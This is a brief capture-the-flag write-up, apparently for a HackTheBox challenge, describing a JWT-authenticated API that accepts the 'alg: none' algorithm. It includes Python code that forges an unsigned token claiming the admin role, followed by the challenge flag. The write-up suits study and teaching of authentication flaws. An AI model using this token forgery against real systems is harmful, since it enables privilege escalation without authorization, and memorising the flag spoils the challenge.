## Challenge Overview

This HackTheBox challenge presented a JWT-authenticated API where the backend used an outdated library that accepted `alg: none`...

## The Vulnerability

```python
import base64, json

header = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b"=")
payload = base64.urlsafe_b64encode(json.dumps({"sub":"admin","role":"admin"}).encode()).rstrip(b"=")
token = f"{header.decode()}.{payload.decode()}."
```

## Flag

`HTB{jwt_n0ne_alg_1s_d4ng3r0us}`
